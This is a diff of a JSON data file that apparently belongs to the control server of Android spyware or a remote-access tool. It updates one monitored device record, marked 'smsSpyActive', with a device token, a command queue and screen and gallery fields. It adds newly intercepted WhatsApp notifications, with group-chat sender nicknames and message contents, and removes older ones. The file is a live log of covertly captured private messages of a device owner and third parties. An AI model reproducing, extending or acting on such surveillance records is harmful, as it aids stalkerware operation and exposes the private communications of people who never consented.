@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1775927599251,
+    "lastSeen": 1775927602617,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈 (4 pesan): ~ Rusjie",
+        "content": "💟 Stiker",
+        "time": "12/04 00:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775927604786
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
+        "content": "‎4 pesan baru",
+        "time": "12/04 00:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775927604779
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
+        "content": "‎3 pesan baru",
+        "time": "12/04 00:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775927601424
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈 (3 pesan): ~ Rusjie",
+        "content": "hore",
+        "time": "12/04 00:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775927601420
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
+        "content": "‎2 pesan baru",
+        "time": "12/04 00:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775927601096
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈 (2 pesan): ~ regàcmèldlv/𝐂𝐈𝐓𝐄𝐍𝟗/ROR",
@@ -4083,46 +4123,6 @@
         "time": "11/04 23:27",
         "pkg": "com.whatsapp",
         "receivedAt": 1775924833231
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈 (12 pesan): ~ rzqii",
-        "content": "ceporot",
-        "time": "11/04 23:27",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775924833117
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
-        "content": "‎11 pesan baru",
-        "time": "11/04 23:27",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775924830931
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈 (11 pesan): ~ rzqii",
-        "content": "ceperet",
-        "time": "11/04 23:27",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775924830829
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
-        "content": "‎10 pesan baru",
-        "time": "11/04 23:27",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775924828103
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈 (10 pesan): ~ rzqii",
-        "content": "ceparat",
-        "time": "11/04 23:27",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775924827982
       }
     ],
     "galleryPhotos": [],
